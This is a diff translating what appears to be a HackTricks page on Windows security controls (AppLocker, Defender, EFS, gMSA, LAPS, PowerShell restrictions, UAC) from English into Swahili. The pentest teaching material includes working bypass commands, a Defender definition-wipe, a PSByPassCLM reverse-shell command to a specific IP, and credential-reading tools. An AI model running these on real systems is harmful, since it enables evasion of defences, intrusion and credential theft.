@@ -4,22 +4,21 @@
 
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Tumia [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kujenga na **kujiendesha kiotomatiki** kazi zinazotolewa na zana za jamii **zilizoendelea zaidi** duniani.\
+Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## AppLocker Policy
 
-An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.
+Orodha ya programu ni orodha ya programu au executable zilizothibitishwa ambazo zinaruhusiwa kuwepo na kuendesha kwenye mfumo. Lengo ni kulinda mazingira kutokana na malware hatari na programu zisizothibitishwa ambazo hazilingani na mahitaji maalum ya biashara ya shirika.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
-It is common for organizations to **block cmd.exe and PowerShell.exe** and write access to certain directories, **but this can all be bypassed**.
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la orodha ya programu** la Microsoft na inawapa wasimamizi wa mifumo udhibiti juu ya **ni programu na faili zipi watumiaji wanaweza kuendesha**. Inatoa **udhibiti wa kina** juu ya executable, skripti, faili za Windows installer, DLLs, programu zilizopakiwa, na waendeshaji wa programu zilizopakiwa.\
+Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na kuandika ufikiaji kwa baadhi ya directories, **lakini hii yote inaweza kupuuziliwa mbali**.
 
 ### Check
 
-Check which files/extensions are blacklisted/whitelisted:
-
+Angalia faili/nyongeza zipi zimeorodheshwa kwenye orodha ya mblacklist/whitelist:
 ```powershell
 Get-ApplockerPolicy -Effective -xml
 
@@ -28,63 +27,60 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-
-This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:
+Hii njia ya rejista inaelezea mipangilio na sera zinazotumika na AppLocker, ikitoa njia ya kupitia seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
 ### Bypass
 
-- Useful **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.
-
+- **Mafolda yanayoweza kuandikwa** yenye manufaa ili kupita Sera ya AppLocker: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows` kuna **mafolda yanayoweza kuandikwa** unaweza kutumia ili **kupita hii**.
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
+- Binaries za kawaida **zilizoaminika** [**"LOLBAS's"**](https://lolbas-project.github.io/) zinaweza pia kuwa na manufaa katika kupita AppLocker.
+- **Kanuni zilizoandikwa vibaya zinaweza pia kupitishwa**
+- Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folda inayoitwa `allowed`** mahali popote na itaruhusiwa.
+- Mashirika mara nyingi pia yanazingatia **kuzuia `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, lakini yanasahau kuhusu **mengine** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kama vile `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
+- **DLL enforcement mara chache huwekwa** kutokana na mzigo wa ziada ambao inaweza kuweka kwenye mfumo, na kiasi cha majaribio kinachohitajika kuhakikisha hakuna kitu kitaharibika. Hivyo kutumia **DLLs kama milango ya nyuma kutasaidia kupita AppLocker**.
+- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza Powershell** msimbo katika mchakato wowote na kupita AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-- Commonly **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries can be also useful to bypass AppLocker.
-- **Poorly written rules could also be bypassed**
-  - For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
-  - Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
-- **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
-- You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+## Hifadhi ya Akida
 
-## Credentials Storage
+### Meneja wa Akaunti za Usalama (SAM)
 
-### Security Accounts Manager (SAM)
+Akida za ndani zipo katika faili hii, nywila zimepangwa.
 
-Local credentials are present in this file, the passwords are hashed.
+### Mamlaka ya Usalama wa Mitaa (LSA) - LSASS
 
-### Local Security Authority (LSA) - LSASS
+**Akida** (zilizopangwa) zime **hifadhiwa** katika **kumbukumbu** ya mfumo huu kwa sababu za Usajili wa Moja.\
+**LSA** inasimamia **sera ya usalama** ya ndani (sera ya nywila, ruhusa za watumiaji...), **uthibitishaji**, **tokens za ufikiaji**...\
+LSA itakuwa ndiyo itakayofanya **ukaguzi** wa akida zilizotolewa ndani ya faili ya **SAM** (kwa kuingia kwa ndani) na **kuzungumza** na **kikundi cha kudhibiti** ili kuthibitisha mtumiaji wa kikoa.
 
-The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
-**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
-LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.
+**Akida** zime **hifadhiwa** ndani ya **mchakato LSASS**: tiketi za Kerberos, hashes NT na LM, nywila zinazoweza kufichuliwa kwa urahisi.
 
-The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.
+### Siri za LSA
 
-### LSA secrets
+LSA inaweza kuhifadhi kwenye diski baadhi ya akida:
 
-LSA could save in disk some credentials:
-
-- Password of the computer account of the Active Directory (unreachable domain controller).
-- Passwords of the accounts of Windows services
-- Passwords for scheduled tasks
-- More (password of IIS applications...)
+- Nywila ya akaunti ya kompyuta ya Active Directory (kikundi cha kudhibiti kisichoweza kufikiwa).
+- Nywila za akaunti za huduma za Windows
+- Nywila za kazi zilizopangwa
+- Zaidi (nywila za programu za IIS...)
 
 ### NTDS.dit
 
-It is the database of the Active Directory. It is only present in Domain Controllers.
+Ni hifadhidata ya Active Directory. Inapatikana tu katika Vikundi vya Kudhibiti.
 
-## Defender
+## Mlinzi
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, na katika matoleo ya Windows Server. In **zuia** zana za kawaida za pentesting kama **`WinPEAS`**. Hata hivyo, kuna njia za **kupita ulinzi huu**.
 
-### Check
+### Angalia
 
-To check the **status** of **Defender** you can execute the PS cmdlet **`Get-MpComputerStatus`** (check the value of **`RealTimeProtectionEnabled`** to know if it's active):
+Ili kuangalia **hali** ya **Mlinzi** unaweza kutekeleza cmdlet ya PS **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** kujua kama inafanya kazi):
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -103,8 +99,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-To enumerate it you could also run:
-
+Ili kuhesabu unaweza pia kukimbia:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -113,69 +108,66 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
-
 ## Encrypted File System (EFS)
 
-EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
+EFS inalinda faili kupitia usimbaji, ikitumia **symmetric key** inayojulikana kama **File Encryption Key (FEK)**. Funguo hii inasimbwa kwa kutumia **public key** ya mtumiaji na kuhifadhiwa ndani ya $EFS **alternative data stream** ya faili iliyosimbwa. Wakati usimbuaji unahitajika, **private key** inayolingana na cheti cha kidijitali cha mtumiaji inatumika kusimbua FEK kutoka kwenye $EFS stream. Maelezo zaidi yanaweza kupatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
-**Decryption scenarios without user initiation** include:
+**Mifano ya Usimbuaji bila kuanzishwa na mtumiaji** ni pamoja na:
 
-- When files or folders are moved to a non-EFS file system, like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), they are automatically decrypted.
-- Encrypted files sent over the network via SMB/CIFS protocol are decrypted prior to transmission.
+- Wakati faili au folda zinapohamishwa kwenye mfumo wa faili usio EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), zinapaswa kusimbuliwa moja kwa moja.
+- Faili zilizofichwa zinazotumwa kupitia mtandao kwa kutumia SMB/CIFS protocol zinapaswa kusimbuliwa kabla ya usafirishaji.
 
-This encryption method allows **transparent access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit decryption.
+Njia hii ya usimbuaji inaruhusu **upatikanaji wa wazi** kwa faili zilizofichwa kwa mmiliki. Hata hivyo, kubadilisha tu nenosiri la mmiliki na kuingia hakutaruhusu usimbuaji.
 
-**Key Takeaways**:
+**Mambo Muhimu**:
 
-- EFS uses a symmetric FEK, encrypted with the user's public key.
-- Decryption employs the user's private key to access the FEK.
-- Automatic decryption occurs under specific conditions, like copying to FAT32 or network transmission.
-- Encrypted files are accessible to the owner without additional steps.
+- EFS inatumia FEK ya symmetric, iliyosimbwa kwa kutumia public key ya mtumiaji.
+- Usimbuaji unatumia private key ya mtumiaji kupata FEK.
+- Usimbuaji wa moja kwa moja unafanyika chini ya hali maalum, kama vile kunakili kwenye FAT32 au usafirishaji wa mtandao.
+- Faili zilizofichwa zinapatikana kwa mmiliki bila hatua za ziada.
 
-### Check EFS info
+### Angalia taarifa za EFS
 
-Check if a **user** has **used** this **service** checking if this path exists:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+Angalia kama **mtumiaji** amekuwa **akitumia** huduma hii kwa kuangalia kama njia hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-Check **who** has **access** to the file using cipher /c \<file>\
-You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files
+Angalia **nani** ana **upatikanaji** wa faili kwa kutumia cipher /c \<file>\
+Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda ili **kusimbua** na **kusimbua** faili zote
 
-### Decrypting EFS files
+### Kusimbua faili za EFS
 
-#### Being Authority System
+#### Kuwa Mamlaka ya Mfumo
 
-This way requires the **victim user** to be **running** a **process** inside the host. If that is the case, using a `meterpreter` sessions you can impersonate the token of the process of the user (`impersonate_token` from `incognito`). Or you could just `migrate` to process of the user.
+Njia hii inahitaji **mtumiaji waathiriwa** kuwa **akifanya** **mchakato** ndani ya mwenyeji. Ikiwa hiyo ni kesi, kwa kutumia `meterpreter` sessions unaweza kujifanya kuwa token ya mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu `migrate` kwenye mchakato wa mtumiaji.
 
-#### Knowing the users password
+#### Kujua nenosiri la watumiaji
 
 {% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}
 
 ## Group Managed Service Accounts (gMSA)
 
-Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the management of service accounts in IT infrastructures. Unlike traditional service accounts that often have the "**Password never expire**" setting enabled, gMSAs offer a more secure and manageable solution:
+Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa akaunti za huduma katika miundombinu ya IT. Tofauti na akaunti za huduma za jadi ambazo mara nyingi zina mipangilio ya "**Password never expire**" iliyowekwa, gMSAs hutoa suluhisho salama na linaloweza kusimamiwa zaidi:
 
-- **Automatic Password Management**: gMSAs use a complex, 240-character password that automatically changes according to domain or computer policy. This process is handled by Microsoft's Key Distribution Service (KDC), eliminating the need for manual password updates.
-- **Enhanced Security**: These accounts are immune to lockouts and cannot be used for interactive logins, enhancing their security.
-- **Multiple Host Support**: gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.
-- **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
-- **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount details or DNS name, simplifying SPN management.
+- **Usimamizi wa Nenosiri wa Moja kwa Moja**: gMSAs hutumia nenosiri tata, la herufi 240 ambalo hubadilika moja kwa moja kulingana na sera ya kikoa au kompyuta. Mchakato huu unashughulikiwa na Huduma ya Usambazaji wa Funguo ya Microsoft (KDC), ikiondoa haja ya masasisho ya nenosiri ya mkono.
+- **Usalama Ulioimarishwa**: Akaunti hizi hazihusiki na kufungwa na haziwezi kutumika kwa kuingia kwa mwingiliano, kuimarisha usalama wao.
+- **Msaada wa Wenyeji Wengi**: gMSAs zinaweza kushirikiwa kati ya wenyeji wengi, na kuifanya kuwa bora kwa huduma zinazotumia seva nyingi.
+- **Uwezo wa Kazi Iliyopangwa**: Tofauti na akaunti za huduma zinazodhibitiwa, gMSAs zinasaidia kuendesha kazi zilizopangwa.
+- **Usimamizi wa SPN Ulio Rahisishwa**: Mfumo unasasisha moja kwa moja Jina la Kitaalamu la Huduma (SPN) wakati kuna mabadiliko katika maelezo ya sAMaccount ya kompyuta au jina la DNS, kuimarisha usimamizi wa SPN.
 
-The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with 'Sealing & Secure'.
+Nenosiri za gMSAs zinahifadhiwa katika mali ya LDAP _**msDS-ManagedPassword**_ na zinapaswa kurekebishwa moja kwa moja kila siku 30 na Wajibu wa Kikoa (DCs). Nenosiri hili, ambalo ni data iliyosimbwa inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), linaweza kupatikana tu na wasimamizi walioidhinishwa na seva ambazo gMSAs zimewekwa, kuhakikisha mazingira salama. Ili kufikia taarifa hii, unahitaji muunganisho salama kama LDAPS, au muunganisho lazima uthibitishwe na 'Sealing & Secure'.
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)
 
-You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
-
+Unaweza kusoma nenosiri hili kwa [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
+[**Pata maelezo zaidi katika chapisho hili**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)
-
-Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
+Pia, angalia hii [ukurasa wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kufanya **NTLM relay attack** ili **kusoma** **nenosiri** la **gMSA**.
 
 ## LAPS
 
-The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.
+**Local Administrator Password Solution (LAPS)**, inayopatikana kwa kupakua kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), inaruhusu usimamizi wa nenosiri za Msimamizi wa ndani. Nenosiri haya, ambayo ni **ya nasibu**, ya kipekee, na **yanabadilishwa mara kwa mara**, huhifadhiwa kwa kati katika Active Directory. Ufikiaji wa nenosiri haya umewekwa vizuizi kupitia ACLs kwa watumiaji walioidhinishwa. Ikiwa ruhusa za kutosha zimetolewa, uwezo wa kusoma nenosiri za msimamizi wa ndani unapatikana.
 
 {{#ref}}
 ../active-directory-methodology/laps.md
@@ -183,43 +175,34 @@ The **Local Administrator Password Solution (LAPS)**, available for download fro
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
+PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **inafungia mbali vipengele vingi** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia vitu vya COM, kuruhusu tu aina za .NET zilizothibitishwa, michakato ya XAML, madarasa ya PowerShell, na zaidi.
 
-### **Check**
-
+### **Angalia**
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
 ```
-
-### Bypass
-
+### Kupita
 ```powershell
 #Easy bypass
 Powershell -version 2
 ```
+Katika Windows ya sasa, Bypass hiyo haitafanya kazi lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
+**Ili kuikamilisha unaweza kuhitaji** **kui** _**Ongeza Rejeleo**_ -> _Browse_ -> _Browse_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **badilisha mradi kuwa .Net4.5**.
 
-In current Windows that Bypass won't work but you can use[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.
-
-#### Direct bypass:
-
+#### Bypass ya moja kwa moja:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-
 #### Reverse shell:
-
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
+Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza Powershell** msimbo katika mchakato wowote na kupita njia iliyozuiliwa. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+## Sera ya Utekelezaji wa PS
 
-## PS Execution Policy
-
-By default it is set to **restricted.** Main ways to bypass this policy:
-
+Kwa default imewekwa kuwa **imezuiliwa.** Njia kuu za kupita sera hii:
 ```powershell
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -239,33 +222,32 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
+Zaidi ya hayo yanaweza kupatikana [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
-More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+## Interface ya Msaada wa Usalama (SSPI)
 
-## Security Support Provider Interface (SSPI)
+Ni API inayoweza kutumika kuthibitisha watumiaji.
 
-Is the API that can be use to authenticate users.
+SSPI itakuwa na jukumu la kutafuta itifaki inayofaa kwa mashine mbili zinazotaka kuwasiliana. Njia inayopendekezwa kwa hili ni Kerberos. Kisha SSPI itajadili itifaki ipi ya uthibitishaji itatumika, hizi itifaki za uthibitishaji zinaitwa Mtoa Msaada wa Usalama (SSP), ziko ndani ya kila mashine ya Windows katika mfumo wa DLL na mashine zote mbili lazima ziunge mkono ile ile ili kuweza kuwasiliana.
 
-The SSPI will be in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines must support the same to be able to communicate.
+### SSPs Kuu
 
-### Main SSPs
+- **Kerberos**: Ile inayopendekezwa
+- %windir%\Windows\System32\kerberos.dll
+- **NTLMv1** na **NTLMv2**: Sababu za ulinganifu
+- %windir%\Windows\System32\msv1_0.dll
+- **Digest**: Seva za wavuti na LDAP, nenosiri katika mfumo wa hash ya MD5
+- %windir%\Windows\System32\Wdigest.dll
+- **Schannel**: SSL na TLS
+- %windir%\Windows\System32\Schannel.dll
+- **Negotiate**: Inatumika kujadili itifaki ya kutumia (Kerberos au NTLM, Kerberos ikiwa chaguo la msingi)
+- %windir%\Windows\System32\lsasrv.dll
 
-- **Kerberos**: The preferred one
-  - %windir%\Windows\System32\kerberos.dll
-- **NTLMv1** and **NTLMv2**: Compatibility reasons
-  - %windir%\Windows\System32\msv1_0.dll
-- **Digest**: Web servers and LDAP, password in form of a MD5 hash
-  - %windir%\Windows\System32\Wdigest.dll
-- **Schannel**: SSL and TLS
-  - %windir%\Windows\System32\Schannel.dll
-- **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
-  - %windir%\Windows\System32\lsasrv.dll
+#### Majadiliano yanaweza kutoa mbinu kadhaa au moja tu.
 
-#### The negotiation could offer several methods or only one.
+## UAC - Udhibiti wa Akaunti ya Mtumiaji
 
-## UAC - User Account Control
-
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**.
+[Udhibiti wa Akaunti ya Mtumiaji (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuonyeshwa kwa idhini kwa shughuli zilizoimarishwa**.
 
 {{#ref}}
 uac-user-account-control.md
@@ -274,12 +256,11 @@ uac-user-account-control.md
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Tumia [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kujenga na **kujiendesha kiotomatiki** kwa urahisi kwa kutumia zana za jamii **zilizoendelea zaidi** duniani.\
+Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ---
 
 {{#include ../../banners/hacktricks-training.md}}
-
